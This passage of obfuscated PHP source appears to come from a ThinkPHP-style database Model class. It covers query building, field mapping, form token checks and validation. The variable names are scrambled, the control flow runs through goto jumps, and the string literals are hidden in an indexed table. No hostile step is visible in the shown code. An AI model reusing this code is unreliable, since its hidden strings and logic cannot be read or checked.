} if (empty($CïÆŠ²‰¡Ø)) { return null; } goto Fˆ‡¹£„¤ô; d±×¼§…–Ë: $EŒŒ¦¶‡“¨ =& $_SERVER[ÍÓÖ€°å]; if (is_string($dæ©õ«ßôä) || is_numeric($dæ©õ«ßôä)) { $F£ŒƒÚçë® = $this->getPk(); if (strpos($dæ©õ«ßôä, $EŒŒ¦¶‡“¨[47])) { $D˜ªºÛ—™Á[$F£ŒƒÚçë®] = array($EŒŒ¦¶‡“¨[256], $dæ©õ«ßôä); } else { $D˜ªºÛ—™Á[$F£ŒƒÚçë®] = $dæ©õ«ßôä; } $this->options[$EŒŒ¦¶‡“¨[255]] = $D˜ªºÛ—™Á; } elseif (!1 === $dæ©õ«ßôä) { $dæ©õ«ßôä = $this->_parseOptions(); return $EŒŒ¦¶‡“¨[257] . $this->db->buildSelectSql($dæ©õ«ßôä) . $EŒŒ¦¶‡“¨[258]; } $dæ©õ«ßôä = $this->_parseOptions(); goto A×ö×è†; Fˆ‡¹£„¤ô: $this->_afterSelect($CïÆŠ²‰¡Ø, $dæ©õ«ßôä); return $CïÆŠ²‰¡Ø; goto Dšè½‘ø¯; Dšè½‘ø¯: } protected function _afterSelect(&$Dµø±›ä”, $D¥—Î÷’Æ­) { } public function buildSql($E‚ÊÜÑÎÙ‡ = array()) { $c¾¥›Ş¸³ =& $_SERVER[ÍÓÖ€°å]; $E‚ÊÜÑÎÙ‡ = $this->_parseOptions($E‚ÊÜÑÎÙ‡); return $c¾¥›Ş¸³[257] . $this->db->buildSelectSql($E‚ÊÜÑÎÙ‡) . $c¾¥›Ş¸³[258]; } public function optionsValue($FÚ†á”òÑâ = null) { if (is_null($FÚ†á”òÑâ)) { return $this->options; } elseif (is_array($FÚ†á”òÑâ)) { $this->options = array_merge($this->options, $FÚ†á”òÑâ); } } protected function _parseOptions($CÓ¨…ï‚ç– = array()) { goto C§Ñø´¬¡©; C§Ñø´¬¡©: $eà¯Ö·”±× =& $_SERVER[ÍÓÖ€°å]; if (is_array($CÓ¨…ï‚ç–)) { $CÓ¨…ï‚ç– = array_merge($this->options, $CÓ¨…ï‚ç–); } $this->options = array(); goto E£ËµÂëôë; E£ËµÂëôë: if (!isset($CÓ¨…ï‚ç–[$eà¯Ö·”±×[259]])) { $CÓ¨…ï‚ç–[$eà¯Ö·”±×[259]] = $this->getTableName(); $FïÂÓ°ñíˆ = $this->fields; } else { $FïÂÓ°ñíˆ = $this->getDbFields(); } if (!empty($CÓ¨…ï‚ç–[$eà¯Ö·”±×[260]])) { $CÓ¨…ï‚ç–[$eà¯Ö·”±×[259]] .= $eà¯Ö·”±×[50] . $CÓ¨…ï‚ç–[$eà¯Ö·”±×[260]]; } $CÓ¨…ï‚ç–[$eà¯Ö·”±×[261]] = $this->name; goto BŸÈ«§“†“; BŸÈ«§“†“: if (isset($CÓ¨…ï‚ç–[$eà¯Ö·”±×[255]]) && is_array($CÓ¨…ï‚ç–[$eà¯Ö·”±×[255]]) && !empty($FïÂÓ°ñíˆ) && !isset($CÓ¨…ï‚ç–[$eà¯Ö·”±×[262]]) && !isset($CÓ¨…ï‚ç–[$eà¯Ö·”±×[259]])) { foreach ($CÓ¨…ï‚ç–[$eà¯Ö·”±×[255]] as $a¦Õ“à‹š‹ => $b›¼­Ø¾Å‚) { $a¦Õ“à‹š‹ = trim($a¦Õ“à‹š‹); if (in_array($a¦Õ“à‹š‹, $FïÂÓ°ñíˆ, !0)) { if (is_scalar($b›¼­Ø¾Å‚)) { $this->_parseType($CÓ¨…ï‚ç–[$eà¯Ö·”±×[255]], $a¦Õ“à‹š‹); } } elseif (!is_numeric($a¦Õ“à‹š‹) && $eà¯Ö·”±×[71] != substr($a¦Õ“à‹š‹, 0, 1) && !1 === strpos($a¦Õ“à‹š‹, $eà¯Ö·”±×[90]) && !1 === strpos($a¦Õ“à‹š‹, $eà¯Ö·”±×[240]) && !1 === strpos($a¦Õ“à‹š‹, $eà¯Ö·”±×[263]) && !1 === strpos($a¦Õ“à‹š‹, $eà¯Ö·”±×[264])) { unset($CÓ¨…ï‚ç–[$eà¯Ö·”±×[255]][$a¦Õ“à‹š‹]); } } } $this->_options_filter($CÓ¨…ï‚ç–); return $CÓ¨…ï‚ç–; goto C‡åÜ¿Ô…; C‡åÜ¿Ô…: } protected function _options_filter(&$eß“öâ¤µÅ) { } protected function _parseType(&$AÒîÙÃ¹‘, $B¶‡Ÿ¨šº) { $DÊ…Ô­ò†Ç =& $_SERVER[ÍÓÖ€°å]; if (empty($this->options[$DÊ…Ô­ò†Ç[265]][$DÊ…Ô­ò†Ç[4] . $B¶‡Ÿ¨šº])) { $Dª®¢¶Èİ² = strtolower($this->fields[$DÊ…Ô­ò†Ç[232]][$B¶‡Ÿ¨šº]); if (!1 !== strpos($Dª®¢¶Èİ², $DÊ…Ô­ò†Ç[266])) { } elseif (!1 === strpos($Dª®¢¶Èİ², $DÊ…Ô­ò†Ç[267]) && !1 !== strpos($Dª®¢¶Èİ², $DÊ…Ô­ò†Ç[268])) { $AÒîÙÃ¹‘[$B¶‡Ÿ¨šº] = intval($AÒîÙÃ¹‘[$B¶‡Ÿ¨šº]); } elseif (!1 !== strpos($Dª®¢¶Èİ², $DÊ…Ô­ò†Ç[269]) || !1 !== strpos($Dª®¢¶Èİ², $DÊ…Ô­ò†Ç[270])) { $AÒîÙÃ¹‘[$B¶‡Ÿ¨šº] = floatval($AÒîÙÃ¹‘[$B¶‡Ÿ¨šº]); } elseif (!1 !== strpos($Dª®¢¶Èİ², $DÊ…Ô­ò†Ç[271])) { $AÒîÙÃ¹‘[$B¶‡Ÿ¨šº] = (bool) $AÒîÙÃ¹‘[$B¶‡Ÿ¨šº]; } } } public function find($C«Š…³ƒ¬ = array()) { goto BÁÇë»°Ï•; BÁÇë»°Ï•: $bµ¥©¾ñ¶Û =& $_SERVER[ÍÓÖ€°å]; if (is_numeric($C«Š…³ƒ¬) || is_string($C«Š…³ƒ¬)) { $fãÚ–¨æ[$this->getPk()] = $C«Š…³ƒ¬; $this->options[$bµ¥©¾ñ¶Û[255]] = $fãÚ–¨æ; } $this->options[$bµ¥©¾ñ¶Û[272]] = 1; goto eÑ¥Ê™ãª; B±”Š™¨÷˜: if (empty($c¸‡™åêæó)) { return null; } $this->data = $c¸‡™åêæó[0]; $this->_afterFind($this->data, $C«Š…³ƒ¬); goto e·¯İ¹öğ; e·¯İ¹öğ: if (!empty($this->options[$bµ¥©¾ñ¶Û[273]])) { return $this->returnResult($this->data, $this->options[$bµ¥©¾ñ¶Û[273]]); } return $this->data; goto fë¡›àÁ¬ê; eÑ¥Ê™ãª: $C«Š…³ƒ¬ = $this->_parseOptions(); $c¸‡™åêæó = $this->db->select($C«Š…³ƒ¬); if (!1 === $c¸‡™åêæó) { return !1; } goto B±”Š™¨÷˜; fë¡›àÁ¬ê: } protected function _afterFind(&$FŒ¸÷îİß¹, $D¬óÀšç«Ö) { } protected function returnResult($e½Ì¨‹êÖ‚, $A’óŞäõÒë = '') { $dˆß±öøƒ =& $_SERVER[ÍÓÖ€°å]; if ($A’óŞäõÒë) { if (is_callable($A’óŞäõÒë)) { return call_user_func($A’óŞäõÒë, $e½Ì¨‹êÖ‚); } switch (strtolower($A’óŞäõÒë)) { case $dˆß±öøƒ[274]: return json_encode($e½Ì¨‹êÖ‚); case $dˆß±öøƒ[275]: return xml_encode($e½Ì¨‹êÖ‚); } } return $e½Ì¨‹êÖ‚; } public function parseFieldsMap($fªˆ‡‘ÜÌ‚, $A‡’¶ÜÈïÌ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $CæªàÃŒ‚ô => $dŠèİ¶¡†œ) { if ($A‡’¶ÜÈïÌ == 1) { if (isset($fªˆ‡‘ÜÌ‚[$dŠèİ¶¡†œ])) { $fªˆ‡‘ÜÌ‚[$CæªàÃŒ‚ô] = $fªˆ‡‘ÜÌ‚[$dŠèİ¶¡†œ]; unset($fªˆ‡‘ÜÌ‚[$dŠèİ¶¡†œ]); } } else { if (isset($fªˆ‡‘ÜÌ‚[$CæªàÃŒ‚ô])) { $fªˆ‡‘ÜÌ‚[$dŠèİ¶¡†œ] = $fªˆ‡‘ÜÌ‚[$CæªàÃŒ‚ô]; unset($fªˆ‡‘ÜÌ‚[$CæªàÃŒ‚ô]); } } } } return $fªˆ‡‘ÜÌ‚; } public function setField($ešÖÚÂÛ×±, $e¯Ø×‡Àíà = '') { if (is_array($ešÖÚÂÛ×±)) { $B”…Ê‚à”‚ = $ešÖÚÂÛ×±; } else { $B”…Ê‚à”‚[$ešÖÚÂÛ×±] = $e¯Ø×‡Àíà; } return $this->save($B”…Ê‚à”‚); } public function setAdd($C²¸ƒ„æÀë, $CáÖ¤ëŒÓ¦ = 1) { $Aá†ùƒ¨ÛŒ =& $_SERVER[ÍÓÖ€°å]; $B¥¼³ÒÁã› = $C²¸ƒ„æÀë . $Aá†ùƒ¨ÛŒ[276] . $CáÖ¤ëŒÓ¦; if ($CáÖ¤ëŒÓ¦ < 0) { $B¥¼³ÒÁã› = $C²¸ƒ„æÀë . $CáÖ¤ëŒÓ¦; } return $this->setField($C²¸ƒ„æÀë, array($Aá†ùƒ¨ÛŒ[277], $B¥¼³ÒÁã›)); } public function getField($C‘¿”„˜‰‚, $eŠ¬ñ™¬‹ = null) { $bª‡Êš£«ß =& $_SERVER[ÍÓÖ€°å]; $D˜ „íˆ‰[$bª‡Êš£«ß[253]] = $C‘¿”„˜‰‚; $D˜ „íˆ‰ = $this->_parseOptions($D˜ „íˆ‰); $C‘¿”„˜‰‚ = trim($C‘¿”„˜‰‚); if (strpos($C‘¿”„˜‰‚, $bª‡Êš£«ß[47])) { if (!isset($D˜ „íˆ‰[$bª‡Êš£«ß[272]])) { $D˜ „íˆ‰[$bª‡Êš£«ß[272]] = is_numeric($eŠ¬ñ™¬‹) ? $eŠ¬ñ™¬‹ : $bª‡Êš£«ß[33]; } $BçÊ‘ï§óŠ = $this->db->select($D˜ „íˆ‰); if (!empty($BçÊ‘ï§óŠ)) { goto A…Îö¶¸Š“; Fö¨™¾·»Š: foreach ($BçÊ‘ï§óŠ as $A‡å¡­«İº) { $bÑ’’×–‰ = $A‡å¡­«İº[$a¯èªß—ñ]; if (2 == $CÑŠ—šŞÙ) { $A¡ô‹„‹‡”[$bÑ’’×–‰] = $A‡å¡­«İº[$E´¯™öÉ‚]; } else { $A¡ô‹„‹‡”[$bÑ’’×–‰] = is_string($eŠ¬ñ™¬‹) ? implode($eŠ¬ñ™¬‹, $A‡å¡­«İº) : $A‡å¡­«İº; } } return $A¡ô‹„‹‡”; goto eĞ¨êæãŞë; Dğ†ÆÑ¼­: $E´¯™öÉ‚ = array_shift($C‘¿”„˜‰‚); $A¡ô‹„‹‡” = array(); $CÑŠ—šŞÙ = count($d¾Åì×ôÂÆ); goto Fö¨™¾·»Š; A…Îö¶¸Š“: $d¾Åì×ôÂÆ = explode($bª‡Êš£«ß[47], $C‘¿”„˜‰‚); $C‘¿”„˜‰‚ = array_keys($BçÊ‘ï§óŠ[0]); $a¯èªß—ñ = array_shift($C‘¿”„˜‰‚); goto Dğ†ÆÑ¼­; eĞ¨êæãŞë: } } else { if (!0 !== $eŠ¬ñ™¬‹) { $D˜ „íˆ‰[$bª‡Êš£«ß[272]] = is_numeric($eŠ¬ñ™¬‹) ? $eŠ¬ñ™¬‹ : 1; } if ($eŠ¬ñ™¬‹ === $bª‡Êš£«ß[235]) { unset($D˜ „íˆ‰[$bª‡Êš£«ß[272]]); } $A‡å¡­«İº = $this->db->select($D˜ „íˆ‰); if (!empty($A‡å¡­«İº)) { if ($eŠ¬ñ™¬‹ === $bª‡Êš£«ß[235]) { return reset($A‡å¡­«İº[0]); } if (!0 !== $eŠ¬ñ™¬‹ && 1 == $D˜ „íˆ‰[$bª‡Êš£«ß[272]]) { return reset($A‡å¡­«İº[0]); } foreach ($A‡å¡­«İº as $d«À¹ŠŸØŠ) { $C‹¯ß‰¨È„[] = $d«À¹ŠŸØŠ[$C‘¿”„˜‰‚]; } return $C‹¯ß‰¨È„; } } return null; } public function create($CÍã¼ïÛ‡ = '', $b¹ÎÁÒÉ÷ = '') { goto B¡É—¥ÁŠ«; e–·ŠÕî¯¤: if ($this->autoCheckFields) { $aÀÇáÚŞ¯Ê = $this->getDbFields(); foreach ($CÍã¼ïÛ‡ as $b¸®«“µö§ => $AõÆñàö‚¤) { if (!in_array($b¸®«“µö§, $aÀÇáÚŞ¯Ê)) { unset($CÍã¼ïÛ‡[$b¸®«“µö§]); } elseif (MAGIC_QUOTES_GPC && is_string($AõÆñàö‚¤)) { $CÍã¼ïÛ‡[$b¸®«“µö§] = stripslashes($AõÆñàö‚¤); } } } $this->autoOperation($CÍã¼ïÛ‡, $b¹ÎÁÒÉ÷); $this->data = $CÍã¼ïÛ‡; goto e©‚ÛÇ­’À; B¡É—¥ÁŠ«: $dàÁ¹”Á› =& $_SERVER[ÍÓÖ€°å]; if (empty($CÍã¼ïÛ‡)) { $CÍã¼ïÛ‡ = $_POST; } elseif (is_object($CÍã¼ïÛ‡)) { $CÍã¼ïÛ‡ = get_object_vars($CÍã¼ïÛ‡); } if (empty($CÍã¼ïÛ‡) || !is_array($CÍã¼ïÛ‡)) { $this->error = think_lang($dàÁ¹”Á›[251]); return !1; } goto cÁ££¿Çœ¯; e©‚ÛÇ­’À: return $CÍã¼ïÛ‡; goto F¥î¾‹°ß; cÁ££¿Çœ¯: $CÍã¼ïÛ‡ = $this->parseFieldsMap($CÍã¼ïÛ‡, 0); $b¹ÎÁÒÉ÷ = $b¹ÎÁÒÉ÷ ? $b¹ÎÁÒÉ÷ : (!empty($CÍã¼ïÛ‡[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$dàÁ¹”Á›[253]])) { $aÀÇáÚŞ¯Ê = $this->options[$dàÁ¹”Á›[253]]; unset($this->options[$dàÁ¹”Á›[253]]); } elseif ($b¹ÎÁÒÉ÷ == THINK_MODEL_INSERT && isset($this->insertFields)) { $aÀÇáÚŞ¯Ê = $this->insertFields; } elseif ($b¹ÎÁÒÉ÷ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $aÀÇáÚŞ¯Ê = $this->updateFields; } goto b©ÇÙÄí®; b©ÇÙÄí®: if (isset($aÀÇáÚŞ¯Ê)) { if (is_string($aÀÇáÚŞ¯Ê)) { $aÀÇáÚŞ¯Ê = explode($dàÁ¹”Á›[47], $aÀÇáÚŞ¯Ê); } if (think_config($dàÁ¹”Á›[278])) { $aÀÇáÚŞ¯Ê[] = think_config($dàÁ¹”Á›[279]); } foreach ($CÍã¼ïÛ‡ as $b¸®«“µö§ => $AõÆñàö‚¤) { if (!in_array($b¸®«“µö§, $aÀÇáÚŞ¯Ê)) { unset($CÍã¼ïÛ‡[$b¸®«“µö§]); } } } if (!$this->autoValidation($CÍã¼ïÛ‡, $b¹ÎÁÒÉ÷)) { return !1; } if (!$this->autoCheckToken($CÍã¼ïÛ‡)) { $this->error = think_lang($dàÁ¹”Á›[280]); return !1; } goto e–·ŠÕî¯¤; F¥î¾‹°ß: } public function autoCheckToken($dòœ“ºëÆ») { $EŞ¦¤“ô÷ =& $_SERVER[ÍÓÖ€°å]; if (isset($this->options[$EŞ¦¤“ô÷[281]]) && !$this->options[$EŞ¦¤“ô÷[281]]) { return !0; } if (think_config($EŞ¦¤“ô÷[278])) { $fÙ·ÉÅø¼ = think_config($EŞ¦¤“ô÷[279]); if (!isset($dòœ“ºëÆ»[$fÙ·ÉÅø¼]) || Session::get($fÙ·ÉÅø¼)) { return !1; } list($E‡¢éßâïÍ, $cŒİì‘ÀŒ–) = explode($EŞ¦¤“ô÷[71], $dòœ“ºëÆ»[$fÙ·ÉÅø¼]); if ($cŒİì‘ÀŒ– && Session::get($fÙ·ÉÅø¼ . $EŞ¦¤“ô÷[90] . $E‡¢éßâïÍ) === $cŒİì‘ÀŒ–) { Session::remove($fÙ·ÉÅø¼ . $EŞ¦¤“ô÷[90] . $E‡¢éßâïÍ); return !0; } if (think_config($EŞ¦¤“ô÷[282])) { Session::remove($fÙ·ÉÅø¼ . $EŞ¦¤“ô÷[90] . $E‡¢éßâïÍ); } return !1; } return !0; } public function regex($E’ÛŠ˜Óí, $F÷Éâ­Ü) { $EÔ„§Ñ®é¡ =& $_SERVER[ÍÓÖ€°å]; $d©¸Ğ÷»˜÷ = array($EÔ„§Ñ®é¡[283] => $EÔ„§Ñ®é¡[284], $EÔ„§Ñ®é¡[285] => $EÔ„§Ñ®é¡[286], $EÔ„§Ñ®é¡[287] => $EÔ„§Ñ®é¡[288], $EÔ„§Ñ®é¡[289] => $EÔ„§Ñ®é¡[290], $EÔ„§Ñ®é¡[291] => $EÔ„§Ñ®é¡[292], $EÔ„§Ñ®é¡[293] => $EÔ„§Ñ®é¡[294], $EÔ„§Ñ®é¡[295] => $EÔ„§Ñ®é¡[296], $EÔ„§Ñ®é¡[270] => $EÔ„§Ñ®é¡[297], $EÔ„§Ñ®é¡[298] => $EÔ„§Ñ®é¡[299]); if (isset($d©¸Ğ÷»˜÷[strtolower($F÷Éâ­Ü)])) { $F÷Éâ­Ü = $d©¸Ğ÷»˜÷[strtolower($F÷Éâ­Ü)]; } return preg_match($F÷Éâ­Ü, $E’ÛŠ˜Óí) === 1; } private function autoOperation(&$cË¨¢§´¯ , $D¼ãÄì‘ø½) { $C”¹‹¶£Ú† =& $_SERVER[ÍÓÖ€°å]; if (!empty($this->options[$C”¹‹¶£Ú†[300]])) { $cîğà£Š = $this->options[$C”¹‹¶£Ú†[300]]; unset($this->options[$C”¹‹¶£Ú†[300]]); } elseif (!empty($this->_auto)) { $cîğà£Š = $this->_auto; } if (isset($cîğà£Š)) { foreach ($cîğà£Š as $Añ÷—ÁˆØÒ) { if (empty($Añ÷—ÁˆØÒ[2])) { $Añ÷—ÁˆØÒ[2] = THINK_MODEL_INSERT; } if ($D¼ãÄì‘ø½ == $Añ÷—ÁˆØÒ[2] || $Añ÷—ÁˆØÒ[2] == THINK_MODEL_BOTH) { switch (trim($Añ÷—ÁˆØÒ[3])) { case $C”¹‹¶£Ú†[301]: case $C”¹‹¶£Ú†[302]: $d‹¿•¹‹Ÿ = isset($Añ÷—ÁˆØÒ[4]) ? (array) $Añ÷—ÁˆØÒ[4] : array(); if (isset($cË¨¢§´¯ [$Añ÷—ÁˆØÒ[0]])) { array_unshift($d‹¿•¹‹Ÿ, $cË¨¢§´¯ [$Añ÷—ÁˆØÒ[0]]); } if ($C”¹‹¶£Ú†[301] == $Añ÷—ÁˆØÒ[3]) { $cË¨¢§´¯ [$Añ÷—ÁˆØÒ[0]] = call_user_func_array($Añ÷—ÁˆØÒ[1], $d‹¿•¹‹Ÿ); } else { $cË¨¢§´¯ [$Añ÷—ÁˆØÒ[0]] = call_user_func_array(array(&$this, $Añ÷—ÁˆØÒ[1]), $d‹¿•¹‹Ÿ); } break; case $C”¹‹¶£Ú†[253]: $cË¨¢§´¯ [$Añ÷—ÁˆØÒ[0]] = $cË¨¢§´¯ [$Añ÷—ÁˆØÒ[1]]; break; case $C”¹‹¶£Ú†[303]: if ($C”¹‹¶£Ú†[33] === $cË¨¢§´¯ [$Añ÷—ÁˆØÒ[0]]) { unset($cË¨¢§´¯ [$Añ÷—ÁˆØÒ[0]]); } break; case $C”¹‹¶£Ú†[304]: default: $cË¨¢§´¯ [$Añ÷—ÁˆØÒ[0]] = $Añ÷—ÁˆØÒ[1]; } if (!1 === $cË¨¢§´¯ [$Añ÷—ÁˆØÒ[0]]) { unset($cË¨¢§´¯ [$Añ÷—ÁˆØÒ[0]]); } } } } return $cË¨¢§´¯ ; } protected function autoValidation($cõ¼’ø£ˆœ, $D•ƒ·½ğò›) { $C Êè¨ĞìØ =& $_SERVER[ÍÓÖ€°å]; if (!empty($this->options[$C Êè¨ĞìØ[305]])) { $cÅî‡†©—Ó = $this->options[$C Êè¨ĞìØ[305]]; unset($this->options[$C Êè¨ĞìØ[305]]); } elseif (!empty($this->_validate)) { $cÅî‡†©—Ó = $this->_validate; } if (isset($cÅî‡†©—Ó)) { if ($this->patchValidate) { $this->error = array(); } foreach ($cÅî‡†©—Ó as $A¢Ç¤—ƒ˜ => $E“¯Úº‰¼) { if (empty($E“¯Úº‰¼[5]) || $E“¯Úº‰¼[5] == THINK_MODEL_BOTH || $E“¯Úº‰¼[5] == $D•ƒ·½ğò›) { if (0 == strpos($E“¯Úº‰¼[2], $C Êè¨ĞìØ[306]) && strpos($E“¯Úº‰¼[2], $C Êè¨ĞìØ[307])) { $E“¯Úº‰¼[2] = think_lang(substr($E“¯Úº‰¼[2], 2, -1)); } $E“¯Úº‰¼[3] = isset($E“¯Úº‰¼[3]) ? $E“¯Úº‰¼[3] : THINK_EXISTS_VALIDATE; $E“¯Úº‰¼[4] = isset($E“¯Úº‰¼[4]) ? $E“¯Úº‰¼[4] : $C Êè¨ĞìØ[308]; switch ($E“¯Úº‰¼[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($cõ¼’ø£ˆœ, $E“¯Úº‰¼)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($C Êè¨ĞìØ[33] != trim($cõ¼’ø£ˆœ[$E“¯Úº‰¼[0]])) { if (!1 === $this->_validationField($cõ¼’ø£ˆœ, $E“¯Úº‰¼)) { return !1; } } break; default: if (isset($cõ¼’ø£ˆœ[$E“¯Úº‰¼[0]])) { if (!1 === $this->_validationField($cõ¼’ø£ˆœ, $E“¯Úº‰¼)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($eÁÙ¾Ô¿ğ«, $cŒ‡Ï†íÀá) { if (!1 === $this->_validationFieldItem($eÁÙ¾Ô¿ğ«, $cŒ‡Ï†íÀá)) { if ($this->patchValidate) { $this->error[$cŒ‡Ï†íÀá[0]] = $cŒ‡Ï†íÀá[2]; } else { $this->error = $cŒ‡Ï†íÀá[2]; return !1; } } return; } protected function _validationFieldItem($aœÌØ§è®, $CƒŞ ²›‰‚) { $CªÍï£ÉÍ“ =& $_SERVER[ÍÓÖ€°å]; switch (strtolower(trim($CƒŞ ²›‰‚[4]))) { case $CªÍï£ÉÍ“[301]: case $CªÍï£ÉÍ“[302]: $eÔ÷¬†¨Ø¶ = isset($CƒŞ ²›‰‚[6]) ? (array) $CƒŞ ²›‰‚[6] : array(); if (is_string($CƒŞ ²›‰‚[0]) && strpos($CƒŞ ²›‰‚[0], $CªÍï£ÉÍ“[47])) { $CƒŞ ²›‰‚[0] = explode($CªÍï£ÉÍ“[47], $CƒŞ ²›‰‚[0]); } if (is_array($CƒŞ ²›‰‚[0])) { foreach ($CƒŞ ²›‰‚[0] as $Béõ—¤‹–É) { $aƒ©´Ê¼èÌ[$Béõ—¤‹–É] = $aœÌØ§è®[$Béõ—¤‹–É]; } array_unshift($eÔ÷¬†¨Ø¶, $aƒ©´Ê¼èÌ); } else { array_unshift($eÔ÷¬†¨Ø¶, $aœÌØ§è®[$CƒŞ ²›‰‚[0]]); } if ($CªÍï£ÉÍ“[301] == $CƒŞ ²›‰‚[4]) { return call_user_func_array($CƒŞ ²›‰‚[1], $eÔ÷¬†¨Ø¶); } else { return call_user_func_array(array(&$this, $CƒŞ ²›‰‚[1]), $eÔ÷¬†¨Ø¶); } case $CªÍï£ÉÍ“[309]: return $aœÌØ§è®[$CƒŞ ²›‰‚[0]] == $aœÌØ§è®[$CƒŞ ²›‰‚[1]]; case $CªÍï£ÉÍ“[310]: if (is_string($CƒŞ ²›‰‚[0]) && strpos($CƒŞ ²›‰‚[0], $CªÍï£ÉÍ“[47])) { $CƒŞ ²›‰‚[0] = explode($CªÍï£ÉÍ“[47], $CƒŞ ²›‰‚[0]); } $BßäùÜ´ = array(); if (is_array($CƒŞ ²›‰‚[0])) { foreach ($CƒŞ ²›‰‚[0] as $Béõ—¤‹–É) { $BßäùÜ´[$Béõ—¤‹–É] = $aœÌØ§è®[$Béõ—¤‹–É]; } } else { $BßäùÜ´[$CƒŞ ²›‰‚[0]] = $aœÌØ§è®[$CƒŞ ²›‰‚[0]]; } if (!empty($aœÌØ§è®[$this->getPk()])) { $BßäùÜ´[$this->getPk()] = array($CªÍï£ÉÍ“[311], $aœÌØ§è®[$this->getPk()]); } if ($this->where($BßäùÜ´)->find()) { return !1; } return !0; default: return $this->check($aœÌØ§è®[$CƒŞ ²›‰‚[0]], $CƒŞ ²›‰‚[1], $CƒŞ ²›‰‚[4]); } } public function check($Fëõ²ù†Ä, $F»‚™Ñ©­, $eèÇ´ºÙ× = "\x72\x65\x67\145\x78") { $dá®„ÒŞÜ =& $_SERVER[ÍÓÖ€°å]; $eèÇ´ºÙ× = strtolower(trim($eèÇ´ºÙ×)); switch ($eèÇ´ºÙ×) { case $dá®„ÒŞÜ[7]: case $dá®„ÒŞÜ[312]: $AóÒñ¬ƒ« = is_array($F»‚™Ñ©­) ? $F»‚™Ñ©­ : explode($dá®„ÒŞÜ[47], $F»‚™Ñ©­); return $eèÇ´ºÙ× == $dá®„ÒŞÜ[7] ? in_array($Fëõ²ù†Ä, $AóÒñ¬ƒ«) : !in_array($Fëõ²ù†Ä, $AóÒñ¬ƒ«); case $dá®„ÒŞÜ[313]: case $dá®„ÒŞÜ[314]: if (is_array($F»‚™Ñ©­)) { $FÏçº®œß = $F»‚™Ñ©­[0]; $fÄ»ƒÎÂÁ = $F»‚™Ñ©­[1]; } else { list($FÏçº®œß, $fÄ»ƒÎÂÁ) = explode($dá®„ÒŞÜ[47], $F»‚™Ñ©­); } return $eèÇ´ºÙ× == $dá®„ÒŞÜ[313] ? $Fëõ²ù†Ä >= $FÏçº®œß && $Fëõ²ù†Ä <= $fÄ»ƒÎÂÁ : $Fëõ²ù†Ä < $FÏçº®œß || $Fëõ²ù†Ä > $fÄ»ƒÎÂÁ; case $dá®„ÒŞÜ[315]: case $dá®„ÒŞÜ[316]: return $eèÇ´ºÙ× == $dá®„ÒŞÜ[315] ? $Fëõ²ù†Ä == $F»‚™Ñ©­ : $Fëõ²ù†Ä != $F»‚™Ñ©­; case $dá®„ÒŞÜ[317]: $f¦è…‰Ì‚ = mb_strlen($Fëõ²ù†Ä, $dá®„ÒŞÜ[318]); if (strpos($F»‚™Ñ©­, $dá®„ÒŞÜ[47])) { list($FÏçº®œß, $fÄ»ƒÎÂÁ) = explode($dá®„ÒŞÜ[47], $F»‚™Ñ©­); return $f¦è…‰Ì‚ >= $FÏçº®œß && $f¦è…‰Ì‚ <= $fÄ»ƒÎÂÁ; } else { return $f¦è…‰Ì‚ == $F»‚™Ñ©­; } case $dá®„ÒŞÜ[319]: list($c²Á‡ìàäé, $Eù¹ÄÉ¼ö) = explode($dá®„ÒŞÜ[47], $F»‚™Ñ©­); if (!is_numeric($c²Á‡ìàäé)) { $c²Á‡ìàäé = strtotime($c²Á‡ìàäé); } if (!is_numeric($Eù¹ÄÉ¼ö)) { $Eù¹ÄÉ¼ö = strtotime($Eù¹ÄÉ¼ö); } return NOW_TIME >= $c²Á‡ìàäé && NOW_TIME <= $Eù¹ÄÉ¼ö; case $dá®„ÒŞÜ[320]: return in_array(get_client_ip(), explode($dá®„ÒŞÜ[47], $F»‚™Ñ©­)); case $dá®„ÒŞÜ[321]: return !in_array(get_client_ip(), explode($dá®„ÒŞÜ[47], $F»‚™Ñ©­)); case $dá®„ÒŞÜ[308]: default: return $this->regex($Fëõ²ù†Ä, $F»‚™Ñ©­); } } public function query($e´×…ˆ…‘ˆ, $E‡ò‡‰îèŸ = false) { $D‹ÎØ«¡å‚ =& $_SERVER[ÍÓÖ€°å]; if (!is_bool($E‡ò‡‰îèŸ) && !is_array($E‡ò‡‰îèŸ)) { $E‡ò‡‰îèŸ = func_get_args(); array_shift($E‡ò‡‰îèŸ); } $e´×…ˆ…‘ˆ = str_replace(array($D‹ÎØ«¡å‚[212], $D‹ÎØ«¡å‚[322]), $D‹ÎØ«¡å‚[50], $e´×…ˆ…‘ˆ); $e´×…ˆ…‘ˆ = $this->parseSql($e´×…ˆ…‘ˆ, $E‡ò‡‰îèŸ); return $this->db->query($e´×…ˆ…‘ˆ); } public function execute($d¨í‘˜ÂˆØ, $bíÊ§¾ÍƒŸ = false) { if (!is_bool($bíÊ§¾ÍƒŸ) && !is_array($bíÊ§¾ÍƒŸ)) { $bíÊ§¾ÍƒŸ = func_get_args(); array_shift($bíÊ§¾ÍƒŸ); } $d¨í‘˜ÂˆØ = $this->parseSql($d¨í‘˜ÂˆØ, $bíÊ§¾ÍƒŸ); return $this->db->execute($d¨í‘˜ÂˆØ); } protected function parseSql($e¨¼œÕ†Ø³, $BÊ¯‰¯‚¥ï) { $D­ß§ùÊ­• =& $_SERVER[ÍÓÖ€°å]; if (!0 === $BÊ¯‰¯‚¥ï) { $aƒÔ¶â®ˆ = $this->_parseOptions(); $e¨¼œÕ†Ø³ = $this->db->parseSql($e¨¼œÕ†Ø³, $aƒÔ¶â®ˆ); } elseif (is_array($BÊ¯‰¯‚¥ï)) { $BÊ¯‰¯‚¥ï = array_map(array($this->db, $D­ß§ùÊ­•[323]), $BÊ¯‰¯‚¥ï); $e¨¼œÕ†Ø³ = vsprintf($e¨¼œÕ†Ø³, $BÊ¯‰¯‚¥ï); } else { $e¨¼œÕ†Ø³ = strtr($e¨¼œÕ†Ø³, array($D­ß§ùÊ­•[324] => $this->getTableName(), $D­ß§ùÊ­•[325] => think_config($D­ß§ùÊ­•[224]))); } $this->db->setModel($this->name); return $e¨¼œÕ†Ø³; } public function db($aŸ™¤Ç’ = '', $C¼÷œ¼ÈÏº = '', $bµİóŸìö = array()) { goto bšíÆõŸšÇ; FÒ®™”š¯Ñ: 